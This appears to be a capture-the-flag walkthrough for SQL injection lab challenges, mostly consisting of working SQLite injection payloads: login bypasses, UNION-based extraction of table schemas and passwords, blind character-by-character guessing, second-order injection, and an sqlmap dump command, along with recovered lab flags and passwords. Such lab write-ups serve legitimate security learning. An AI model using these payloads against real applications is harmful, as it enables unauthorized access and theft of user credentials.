# SQL Injection Lab

<details>
   <summary>Introduction to SQL Injection: Part 2</summary>       
 
   
- ``try to put this in email``
```
', nickName='test', email='hacked
```

> the nikname be came ``test`` and email ``hacked``

- ``want to know data base type``

```
', nickName=sqlite_version(), email='
```

> notice that the nikneame became ``3.22.0`` ==> SQLite

- ``SQLite store his tables in sqlite_master we will try to get all tables``

```
', nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%'), email='
```

> found two tables ``usertable,secrets``

- ``find name of columns of table``

```
', nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name='usertable'), email='
```
``found``

```
CREATE TABLE `usertable` ( `UID` integer primary key,
                           `name` varchar(30) NOT NULL,
                           `profileID` varchar(20) DEFAULT NULL,
                           `salary` int(9) DEFAULT NULL,
                           `passportNr` varchar(20) DEFAULT NULL,
                           `email` varchar(300) DEFAULT NULL,
                           `nickName` varchar(300) DEFAULT NULL,
                           `password` varchar(300) DEFAULT NULL )
```

- ``get usernames and passwords``

```
', nickName=(SELECT group_concat(name,password) FROM usertable), email='
```

> ``And booom``

``found``

```
Francois05842ffb6dc90bef3543dd85ee50dd302f3d1f163de1a76eee073ee97d851937
Michandrec69d171e761fe56711e908515def631856c665dc234a0aa404b32c73bdbc81ac
Coletteb6efdfb0e20a34908c092725db15ae0c3666b3cea558fa74e0667bd91a10a0d3
Phillipbe042a70c99d1c438cdcbd479b955e4fba33faf4f8c494239257e4248bbcf4ff
Ivan6ef110b045cbaa212258f7e5f08ed22216147594464427585871bfab9753ba25
Admin
```

> but here we want the flag so we will see colomns of another tabel ``secrets``

- ``find the flag``

```
', nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name='usertable'), email='
```

``found``

```
CREATE TABLE secrets ( id integer primary key,
                       author integer not null,
                       secret text not null )
```

- ``get the flag``

```
', nickName=(SELECT group_concat(secret) FROM secrets), email='
```

``found``

```
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer a.,Donec viverra consequat quam,
 ut iaculis mi varius a. Phasellus.,Aliquam vestibulum massa justo, in vulputate velit ultrices ac.
 Donec.,Etiam feugiat elit at nisi pellentesque vulputate. Nunc euismod nulla.,
THM{b3a540515dbd9847c29cffa1bef1edfb}
```



  
</details>




-----------------------------------------------------------------------------------------------------------------------




<details>
   <summary>Vulnerable Startup: Broken Authentication</summary>

``write in username``
``
' or 1=1; -- -
``
  
</details>



----------------------------------------------------------------------------------------------------------------------------------------




<details>
   <summary>Vulnerable Startup: Broken Authentication-2</summary>

## ``first``

```
' OR 1=1-- -
```

> when logedin you will find the name of user in top right of page and also in cookie
>
> if you want to decode cookie you can use ``https://www.kirsle.net/wizards/flask-session.cgi`` or this script ``decode_cookie.py``
>
> you will find it like this :
> ```
> {
>    "challenge2_user_id": 1,
>    "challenge2_username": "admin"
> }
> ```


### ``now we will use UNION select to know number of columns that query ask for``

``back to login page and write: ``

```
' UNION SELECT NULL-- -
```
``it failed so will try: ``

```
' UNION SELECT NULL, NULL-- -
' UNION SELECT 1, 2-- -
```
``IT work now use``

⚠️⚠️⚠️

<details>
  <summary>found type of database and tabeles,....</summary>

``type of data_base``

```
' UNION SELECT sqlite_version(), NULL-- -
' UNION SELECT @@version, NULL-- -
```

> ``found that it is sqlite``

### `` now find tables in this database``

```
' UNION SELECT 1, group_concat(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%'-- -
```

> found ``users``

### ``now find name of columns in table``

```
' UNION SELECT 1, sql FROM sqlite_master WHERE name='users' AND type='table'-- -
```

``found:``

```
CREATE TABLE users ( id integer primary key,
                     username text unique not null,
                      password text not null )
```


  
</details>
⚠️⚠️⚠️

> found the name in top right became ``2``


``get all basswords of users``

```
' UNION SELECT 1, group_concat(password) FROM users-- -
```

``found``

```
Logged in as rcLYWHCxeGUsA9tH3GNV,asd,Summer2019!,345m3io4hj3,THM{fb381dfee71ef9c31b93625ad540c9fa},viking123 | 
```
**yapppp!!!**


</details>



-------------------------------------------------------------------------------------------------------------------------




<details>
   <summary>Vulnerable Startup: Broken Authentication 3 (Blind Injection)</summary>

### ``first try to know password length``

```
admin' AND length((SELECT password from users WHERE username='admin'))=1-- -
```
> change ``1`` untill login when login then this is password length you can user ``burp``
>
> found it in ``37``


### ``now try go guess every char in the password ``

```
admin' AND SUBSTR((SELECT password FROM users WHERE username='admin'), 1, 1) = CAST(X'54' as TEXT)-- -
admin' AND SUBSTR((SELECT password FROM users WHERE username='admin'), 1, 1) = a-- -
```
> first ``1`` mean first char in ``password``
>
> second ``1`` mean we use in every time one char
>
> when found first char true change first ``1`` to ``2`` and so on .....

#### ``OR`` YOU can use ``SQLmap``

```
sqlmap -u http://10.10.247.180:5000/challenge3/login \--data="username=admin&password=admin" \--level=5 --risk=3 --dbms=sqlite --technique=B --dump
```
> found this

```
Table: users
[5 entries]
+----+---------------------------------------+----------+
| id | password                              | username |
+----+---------------------------------------+----------+
| 1  | THM{f1f4e0757a09a0b87eeb2f33bca6a5cb} | admin    |
| 3  | asd                                   | amanda   |
| 2  | Summer2019!                           | dev      |
| 5  | 345m3io4hj3                           | emil     |
| 4  | viking123                             | maja     |
+----+---------------------------------------+----------+

```


   
</details>


-------------------------------------------------------------------------------------------------------------------------------------



<details>
   <summary>Vulnerable Startup: Vulnerable Notes</summary>

- > login not vuln but when you enter vuln username it can used when do insert in notes
  >
  > ``login`` with
  >
  > ```
  > ' union select 1, group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%'--
  > ```
  >
  > open notes you will found :
  >
  > ```
  > users,notes
  > ```
  >
  > so it's vuln and you now know tables names
  >
  > now use :
  >
  > ```
  > '  union select 1,group_concat(password) from users'
  > ```
  >
  > ``found``
  >
  > ```
  > THM{4644c7e157fd5498e7e4026c89650814}
  > ```

   
</details>




--------------------------------------------------------------------------------------------------------------------------------------





<details>
     <summary>Vulnerable Startup: Change Password (i like it) 💯</summary>

- > create account using this name:
  >
  > ``admin'-- -``
  >
  > after login we will try to change password , reset password query is not scure this it is :
  >
  > ```
  > UPDATE users SET password = ? WHERE username = 'admin'-- -'
  > ```
  >
  > in this way we change passowrd of ``admin`` user
  >
  > after that login with new passowrd ``admin:123``
  >
  > and ``found``
  >
  > ```
  >  THM{cd5c4f197d708fda06979f13d8081013} 
  > ```
  >
  
   
</details>






-------------------------------------------------------------------------------------------------------------------------------------------










<details>
    <summary>Vulnerable Startup: Book Title</summary>

- > function of search on books it's query is vuln:
  >
  > ```
  > SELECT * FROM books WHERE id = (SELECT id FROM books WHERE title LIKE '" + title + "%')
  > ```
  >
  > we will found in url the title like this
  >
  > ``http://10.10.216.224:5000/challenge6/book?title=test``
  >
  > it's query is :
  >
  > ```
  > SELECT * FROM books WHERE id = (SELECT id FROM books WHERE title LIKE 'test%')
  > ```
  >
  > if i write **``') OR 1=1-- -``**
  >
  > the query will be like
  >
  > ```
  > SELECT * FROM books WHERE id = (SELECT id FROM books WHERE title LIKE '') OR 1=1-- -')
  > ```
  >
  > and it will give us all books : )
  >
  > and now we can user UNION select to get our tables and it's data
  >
  > ![MuaKissGIF](https://github.com/user-attachments/assets/9eef9bc5-c0b9-4e1c-98f2-21e5e00b8d0e)
  >
  > after that write:

  ⚠️⚠️⚠️
<details>
   <summary>get name of table and it's column</summary>

   - > ```
     > ') UNOIN select 1-- -
     > ```
     > no output untill found
     >
     > ```
     > ') union select 1,2,3,4-- -
     > ```
     >
     > ### now we need to know tables name
     >
     > ```
     > ') UNION SELECT 1,2,3, group_concat(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%'-- -
     > ```
     >
     > found
     > **``users,notes,books``**
     >
     > ### ``now find colmn names``
     >
     > ```
     > ') UNION SELECT 1,2,3,sql FROM sqlite_master WHERE name='users' AND type='table'-- -
     > ```
     >
     > found
     > 
     > ```
     > CREATE TABLE users ( id integer primary key,
     >                      username text unique not null,
     >                      password text not null )
     > ```
     >
     > ### get passowrds
     >
     > ```
     > ') union select 1,2,3,group_concat(password) from users-- -
     > ```
     >
     >  ```
     >  THM{27f8f7ce3c05ca8d6553bc5948a89210},asd,Summer2019!,345m3io4hj3,viking123,123
     >  ```
   
</details>
⚠️⚠️⚠️⚠️
   
   - >
     > found that there is users tabel and column call password
     > 
     > ```
     > ') union select 1,2,3,group_concat(password) from users-- -
     > ```
     >
     > ```
     > THM{27f8f7ce3c05ca8d6553bc5948a89210},asd,Summer2019!,345m3io4hj3,viking123,123
     > ```
     > ![MuaKissGIF](https://github.com/user-attachments/assets/9eef9bc5-c0b9-4e1c-98f2-21e5e00b8d0e)
     > 
    
  

  
  
  

   
</details>







---------------------------------------------------------------------------------------------------------------------------------------------




<details>
    <summary>Vulnerable Startup: Book Title 2</summary>


- > in this challenge the query it take two union select
  > ![image](https://github.com/user-attachments/assets/694bd1f1-c501-4b08-bc2c-a2733ebef701)
  >
  > so if i write ``10.10.216.224:5000/challenge7/book?title=' union select '1' -- -``
  >
  > i will see content of book that it's ``id=1``
  > ![image](https://github.com/user-attachments/assets/4947ebae-0843-4456-a88a-04fecb47e3b3)
  >
  > now if i put :
  >
  > ```
  > http://10.10.216.224:5000/challenge7/book?title=' union select '-1''union select 1,27,3,44-- -
  > ```
  > that will be the output
  >
  > ![image](https://github.com/user-attachments/assets/680c37e4-6fe1-4a55-9645-e5a43b0ad488)
  
<details>
  <summary>know tables and ....</summary>

```
' union select '-1''union select 1,2,3,sql FROM sqlite_master WHERE name='users' AND type='table'-- -
```
   
</details>



- > 
  > ### ``now get the passowrd``
  >
  > ```
  > ' union select '-1''union select 1,2,3,group_concat(password) from users-- -
  > ```
  >
  > found
  >
  > ``
  > THM{183526c1843c09809695a9979a672f09},asd,Summer2019!,345m3io4hj3,viking123,123
  > ``   





   
</details>


















---
---
---
---



# ``payloads``

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
